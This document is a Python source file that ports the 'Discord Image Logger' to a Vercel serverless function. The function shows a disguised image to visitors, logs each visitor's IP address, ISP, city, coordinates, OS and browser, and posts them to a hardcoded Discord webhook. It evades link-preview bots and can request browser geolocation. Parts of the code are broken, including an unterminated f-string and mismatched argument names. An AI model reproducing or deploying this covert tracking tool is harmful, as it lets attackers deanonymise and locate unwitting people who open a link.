# --- Vercel Image Logger Code ---

from urllib.parse import urlparse, parse_qs
import requests
import base64
import httpagentparser
from pathlib import Path

# --- Configuration ---
# Make sure your webhook URL and other settings are correct here.
config = {
    "webhook": "https://discordapp.com/api/webhooks/1539314714138648733/ZoqejW4d3irpDf_5BKUoaXUq2pAEvOjc3Sv8cBu2KLnwmHT3_3luLFH80lsVQN9X_bIM",
    "image": "https://www.clipartmax.com/middle/m2H7H7i8b1K9m2b1_troll-face-meme-shaped-sticker-unixstickers-troll-face-jpg",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False, # Keep as False for Vercel compatibility unless you want to debug this complex part
    "accurateLocation": False, # Keep as False for simplicity
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}
blacklistedIPs = ("27", "104", "143", "164")

# --- Helper Functions ---

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")): # Check if ip is not None
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"): # Check if useragent is not None
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except Exception as e:
        print(f"Error sending error report: {e}")

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if not ip: return # Skip if no IP
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json = {
                    "username": config["username"],
                    "content": "",
                    "embeds": [
                        {
                            "title": "Image Logger - Link Sent",
                            "color": config["color"],
                            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                        }
                    ],
                })
            except Exception as e:
                print(f"Error sending link alert: {e}")
        return

    ping = "@everyone"
    info = None
    try:
        ip_info_response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857")
        ip_info_response.raise_for_status()
        info = ip_info_response.json()
    except requests.exceptions.RequestException as e:
        print(f"Could not fetch IP info for {ip}: {e}")
    except ValueError:
        print(f"Invalid JSON response for IP info for {ip}")

    if info:
        if info.get("proxy"):
            if config["vpnCheck"] == 2: return
            if config["vpnCheck"] == 1: ping = ""
        
        if info.get("hosting"):
            if config["antiBot"] == 4:
                if info.get("proxy"): pass
                else: return
            if config["antiBot"] == 3: return
            if config["antiBot"] == 2:
                if info.get("proxy"): pass
                else: ping = ""
            if config["antiBot"] == 1: ping = ""

    os_browser_detect = httpagentparser.simple_detect(useragent) if useragent else ("", "")
    os, browser = os_browser_detect

    embed_description = f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
        
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ')} ({info.get('timezone', 'Unknown').split('/')[0]})`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'False') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": embed_description,
            }
        ],
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json = embed)
    except Exception as e:
        print(f"Error sending report to webhook: {e}")

    return info

# --- Vercel Serverless Function Handler ---
# This is the specific function Vercel expects to run.

def handler(req):
    # req is an object with request details. We return a response dictionary.
    
    parsed_url = urlparse(req.url)
    query_params = parse_qs(parsed_url.query)
    
    image_to_serve = config["image"] # Default image
    if config["imageArgument"] and query_params.get("url"):
        try:
            image_to_serve = base64.b64decode(query_params["url"][0].encode()).decode()
        except Exception: pass
    elif config["imageArgument"] and query_params.get("id"):
        try:
            image_to_serve = base64.b64decode(query_params["id"][0].encode()).decode()
        except Exception: pass

    ip_address = req.headers.get('x-forwarded-for', req.headers.get('remote-addr'))
    user_agent = req.headers.get('user-agent')
    endpoint = parsed_url.path

    # --- Process request ---
    
    if config["redirect"]["redirect"]:
        return {
            "statusCode": 302,
            "headers": {"Location": config["redirect"]["page"]},
            "body": "",
        }

    if ip_address and ip_address.startswith(blacklistedIPs):
        return {
            "statusCode": 403,
            "body": "Access Forbidden",
            "headers": {"Content-Type": "text/plain"}
        }

    bot_detected = botCheck(ip_address, user_agent)

    if bot_detected:
        if config["buggedImage"]:
            loading_image_data = base64.b64decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
            makeReport(ip_address, user_agent=user_agent, endpoint=endpoint, url=image_to_serve)
            return {
                "statusCode": 200,
                "headers": {"Content-Type": "image/jpeg"},
                "body": loading_image_data.decode('latin-1'),
            }
        else:
            makeReport(ip_address, user_agent=useragent, endpoint=endpoint, url=image_to_serve)
            return {
                "statusCode": 302,
                "headers": {"Location": image_to_serve},
                "body": "",
            }

    # --- Standard User Request: Serve HTML with Image ---
    else:
        location_coords = None
        if config["accurateLocation"] and not query_params.get("g"): # Prompt for location if not already provided
            # Vercel Functions don't easily support interactive prompts like this.
            # The script below is designed to redirect the user's browser to a new URL with the coordinates.
            # We'll include it in the HTML response.
            pass

        ip_info = makeReport(ip_address, useragent=user_agent, coords=location_coords, endpoint=endpoint, url=image_to_serve)
        
        html_content = f'''<style>body {{ margin: 0; padding: 0; }} div.img {{ background-image: url('{image_to_serve}'); background-position: center center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }}</style><div class="img"></div>'''

        if config["accurateLocation"] and not query_params.get("g"):
            html_content += """
<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            var newUrl = currenturl;
            if (currenturl.includes("?")) {
                newUrl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                newUrl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(newUrl);
        }, function(error) {
            console.error("Geolocation error:", error);
        });
    } else {
        console.log("Geolocation not supported");
    }
}
</script>
"""
        
        return {
            "statusCode": 200,
            "headers": {"Content-Type": "text/html"},
            "body": html_content,
        }

# --- THIS IS THE KEY FOR VERCEL ---
# Vercel looks for a top-level variable named 'handler' that points to your function.
handler = handler
